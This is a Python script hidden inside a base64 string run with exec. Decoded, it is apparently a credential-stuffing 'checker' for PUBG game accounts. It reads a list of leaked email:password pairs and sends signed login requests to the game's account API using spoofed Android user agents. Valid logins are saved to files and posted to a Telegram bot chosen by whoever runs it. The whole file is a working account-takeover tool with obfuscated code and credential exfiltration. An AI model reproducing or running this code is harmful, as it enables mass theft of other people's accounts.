import base64
exec(base64.b64decode('Zm9vID0gRmFsc2UKaWYgZm9vOgogICAgcGFzcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCmltcG9ydCB0aW1lCkEgPSAnJycbWzE7OTFtJycnCkIgPSAnJycbWzE7OTZtJycnCkMgPSAnJycbWzE7OTdtJycnCkUgPSAnJycbWzE7OTJtJycnCkggPSAnJycbWzE7OTNtJycnCkwgPSAnJycbWzE7OTVtJycnCk0gPSAnJycbWzE7OTRtJycnClogPSAnJycbWzE7NG0nJycKciA9IHJlcXVlc3RzLnNlc3Npb24oKQpwcmludCgnXHgxYls5M21cbiDwn4W/77iO8J+GhO+4jvCfhbHvuI7wn4W277iOIENIRUNLRVIgICAgICAgICAgICcpCnByaW50KGYnJycgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge0J9XG7ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZdcbntMfeKVkXtBfSBQVUJHIHtFfUNIRUNLRVIge0h9SE/FniB7Wn0gR0VMRMSwTlxue0194pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnKQpwcmludChmJycne0V9ICAgIEJ5e0x9OiB7Qn17QX18IHtFfSB7TH06IHtCfXtNfSA9PiBAd2l6YXJkeGNvZGVyJycnKQpJRCA9IGlucHV0KCcnJxtbOTZtSUQgR2lyaW46ICcnJykKdG9rZW4gPSBpbnB1dCgnJycbWzk0bUJvdCBUb2tlbiBHaXJpbjogJycnKQptZW5kbyA9IFsKICAgICcnJ0xpbnV4OyBBbmRyb2lkIDEyOyBTTS1TOTA2TiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2JycnLAogICAgJycnTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IFNNLUc5NzNOIEJ1aWxkL1BQUjEuOTEwMzk3LjgxNycnJywKICAgICcnJ0xpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTk2VSBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2JycnLAogICAgJycnTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5ODBGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YnJycsCiAgICAnJydMaW51eDsgQW5kcm9pZCA5OyBTTS1HOTczVSBCdWlsZC9QUFIxLjE4MDYxMC4wMTEnJycsCiAgICAnJydMaW51eDsgQW5kcm9pZCA4LjAuMDsgU00tRzk2MEYgQnVpbGQvUjE2TlcnJycsCiAgICAnJydMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc4OTJBIEJ1aWxkL05SRDkwTTsgd3YnJycsCiAgICAnJydMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc5MzBWQyBCdWlsZC9OUkQ5ME07IHd2JycnLAogICAgJycnTGludXg7IEFuZHJvaWQgNi4wLjE7IFNNLUc5MzVTIEJ1aWxkL01NQjI5Szsgd3YnJycsCiAgICAnJydMaW51eDsgQW5kcm9pZCA2LjAuMTsgU00tRzkyMFYgQnVpbGQvTU1CMjlLJycnLAogICAgJycnTGludXg7IEFuZHJvaWQgNS4xLjE7IFNNLUc5MjhYIEJ1aWxkL0xNWTQ3WCcnJ10KaGVhZFBVQiA9IHsKICAgICcnJ0NvbnRlbnQtTGVuZ3RoJycnOiAnJycxMjYnJycsCiAgICAnJydBY2NlcHQtRW5jb2RpbmcnJyc6ICcnJ2d6aXAnJycsCiAgICAnJydDb25uZWN0aW9uJycnOiAnJydLZWVwLUFsaXZlJycnLAogICAgJycnSG9zdCcnJzogJycnaWdhbWUubXNka3Bhc3MuY29tJycnLAogICAgJycnVXNlci1BZ2VudCcnJzogZicnJ0RhbHZpay8yLjEuMCB7cmFuZG9tLmNob2ljZShtZW5kbyl9JycnLAogICAgJycnQ29udGVudC1UeXBlJycnOiAnJydhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04JycnIH0KCmRlZiBnZW5fZGV2aWNlKHNlbGYpOgogICAgZGlkID0gdXVpZC51dWlkNCgpCiAgICBkaW5mbyA9IHF1b3RlKGYnJycxfDI4NjAyfHtyYW5kb20uY2hvaWNlKG1lbmRvX2RldmljZSl9fHRyfDIuNi4wfHtpbnQodGltZS50aW1lKCkgKiAxMDAwKX18MS41fDEyODAqNzMwfGdvb2dsZScnJykKCmJhc2FyaWxpX2hlc2FwbGFyID0gMApnZWNlcnNpel9oZXNhcGxhciA9IDAKc2FodGVfaGVzYXBsYXIgPSAwCgpkZWYgQ0hFQ0soZW1haWwsIHBhc3N3b3JkKToKICAgIGdsb2JhbCBiYXNhcmlsaV9oZXNhcGxhciwgc2FodGVfaGVzYXBsYXIsIGdlY2Vyc2l6X2hlc2FwbGFyCiAgICBlbWwgPSBlbWFpbC5zcGxpdCgnJyc6JycnKVswXQogICAgcGFzID0gZW1haWwuc3BsaXQoJycnOicnJylbMV0KICAgIFlFUyA9IGYnJycgXHgxYls5Mm1IaXQ6IHtlbWx9OntwYXN9XG7ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEnJycKICAgIE5PID0gZicnJyBceDFiWzkxbURlYzoge2VtbH06e3Bhc31cbuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgScnJwogICAgU0FIVEUgPSBmJycnIFx4MWJbOTRtRmFrZToge2VtbH06e3Bhc31cbuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgScnJwogICAgcGVzID0gaGFzaGxpYi5tZDUoYnl0ZXMoZicnJ3twYXNzd29yZH0nJycsICcnJ3V0Zi04JycnLCAqKignZW5jb2RpbmcnLCkpKS5oZXhkaWdlc3QoKQogICAgSiA9IGhhc2hsaWIubWQ1KGJ5dGVzKCcnJy9hY2NvdW50L2xvZ2luP2FjY291bnRfcGxhdF90eXBlPTMmYXBwaWQ9ZGQ5MjFlYjE4ZDBjOTRiNDFkZGMxYTYzMTM4ODk2MjcmbGFuZ190eXBlPXRyX1RSJm9zPTF7ImFjY291bnQiOiInJycgKyBlbWwgKyAnJyciLCJhY2NvdW50X3R5cGUiOjEsImFyZWFfY29kZSI6IiIsImV4dHJhX2pzb24iOiIiLCJwYXNzd29yZCI6IicnJyArIHBlcyArICcnJyJ9M2VjOGNkNjlkNzFiNzkyMmUyYTE3NDQ1ODQwODY2YjI2ZDg2ZTI4MycnJywgJycndXRmLTgnJycsICoqKCdlbmNvZGluZycsKSkpLmhleGRpZ2VzdCgpCiAgICB1cmwgPSBmJycnaHR0cHM6Ly9pZ2FtZS5tc2RrcGFzcy5jb20vYWNjb3VudC9sb2dpbj9hY2NvdW50X3BsYXRfdHlwZT0zJmFwcGlkPWRkOTIxZWIxOGQwYzk0YjQxZGRjMWE2MzEzODg5NjI3JmxhbmdfdHlwZT10cl9UUiZvcz0xJnNpZz17Sn0nJycKICAgIGRhUFUgPSAnJyd7ImFjY291bnQiOiInJycgKyBlbWwgKyAnJyciLCJhY2NvdW50X3R5cGUiOjEsImFyZWFfY29kZSI6IiIsImV4dHJhX2pzb24iOiIiLCJwYXNzd29yZCI6IicnJyArIHBlcyArICcnJyJ9JycnCiAgICB0aW1lLnNsZWVwKDAuNSkKICAgIEdPID0gci5nZXQodXJsLCBkYVBVLCBoZWFkUFVCLCAqKignZGF0YScsICdoZWFkZXJzJykpLnRleHQKICAgIGlmICcnJyJ0b2tlbiInJycgaW4gR086CiAgICAgICAgcHJpbnQoWUVTKQogICAgICAgIHIucG9zdChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SUR9JnRleHQ9e1lFU31cbicnJykKICAgICAgICB3aXRoIG9wZW4oJycnYmFzYXJpbGkudHh0JycnLCAnJydhJycnKSBhcyB4OgogICAgICAgICAgICB4LndyaXRlKGVtbCArICcnJzonJycgKyBwYXMgKyAnJycKJycnKQogICAgICAgICAgICBOb25lKE5vbmUsIE5vbmUsIE5vbmUpCiAgICAgICAgaWYgbm90IE5vbmU6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBiYXNhcmlsaV9oZXNhcGxhciArPSAxCiAgICBlbGlmICcnJ0Zha2UnJycgaW4gR086CiAgICAgICAgcHJpbnQoU0FIVEUpCiAgICAgICAgci5wb3N0KGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRH0mdGV4dD17U0FIVEV9XG4nJycpCiAgICAgICAgd2l0aCBvcGVuKCcnJ3NhaHRlLnR4dCcnJywgJycnYScnJykgYXMgeDoKICAgICAgICAgICAgeC53cml0ZShlbWwgKyAnJyc6JycnICsgcGFzICsgJycnCicnJykKICAgICAgICAgICAgTm9uZShOb25lLCBOb25lLCBOb25lKQogICAgICAgIGlmIG5vdCBOb25lOgogICAgICAgICAgICBwYXNzCiAgICAgICAgc2FodGVfaGVzYXBsYXIgKz0gMQogICAgZWxzZToKICAgICAgICBwcmludChOTykKICAgICAgICByLnBvc3QoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rZW59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEfSZ0ZXh0PXtOT31cbicnJykKICAgICAgICB3aXRoIG9wZW4oJycnZ2VjZXJzaXoudHh0JycnLCAnJydhJycnKSBhcyB4OgogICAgICAgICAgICB4LndyaXRlKGVtbCArICcnJzonJycgKyBwYXMgKyAnJycKJycnKQogICAgICAgICAgICBOb25lKE5vbmUsIE5vbmUsIE5vbmUpCiAgICAgICAgaWYgbm90IE5vbmU6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBnZWNlcnNpel9oZXNhcGxhciArPSAxCgoKZGVmIEZJTG5hbWUoKToKICAgIEYgPSBpbnB1dCgnXHgxYls5NW1Mw7x0ZmVuIEdlw6dlcmxpIENvbWJvIEdpcmluOiAnKQogICAgCiAgICB0cnk6CiAgICAgICAgZm9yIHggaW4gb3BlbihGLCAnJydyJycnKS5yZWFkKCkuc3BsaXRsaW5lcygpOgogICAgICAgICAgICBlbWFpbCA9IHgKICAgICAgICAgICAgcGFzc3dvcmQgPSB4LnNwbGl0KCcnJzonJycpWzFdCiAgICAgICAgICAgIENIRUNLKGVtYWlsLCBwYXNzd29yZCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICBwcmludCgnXHgxYls5MW1cbkLDtnlsZSBDb21ibyBCdWx1bmFtYWTEsSFcbicpCiAgICAKICAgIAoKCkZJTG5hbWUoKQpwcmludChmJycne0V9IFRvcGxhbSBCYcWfYXLEsWzEsSBIZXNhcGxhcjoge2Jhc2FyaWxpX2hlc2FwbGFyfScnJykKcHJpbnQoZicnJ3tBfSBUb3BsYW0gR2XDp2Vyc2l6IEhlc2FwbGFyOiB7Z2VjZXJzaXpfaGVzYXBsYXJ9XG57SH0nJycp').decode())